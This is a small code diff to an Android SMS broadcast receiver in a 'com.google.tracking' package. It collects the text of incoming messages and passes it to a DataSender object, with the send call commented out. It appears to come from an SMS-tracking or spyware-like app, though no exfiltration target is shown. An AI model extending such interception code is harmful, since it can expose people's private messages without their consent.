@@ -1,10 +1,11 @@
-package com.google.tracking;
+package com.google.tracking.sms;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
+import com.google.tracking.sender.DataSender;
 
 public class SmsReceiver extends BroadcastReceiver {
     @Override
@@ -21,7 +22,8 @@ public class SmsReceiver extends BroadcastReceiver {
                 str += msgs[i].getMessageBody().toString();
             }
 //
-            SmsAggregator sender = new SmsAggregator(str, context);
+            DataSender sender = new DataSender();
+//            sender.sendSMS(str);
         }
     }
 }
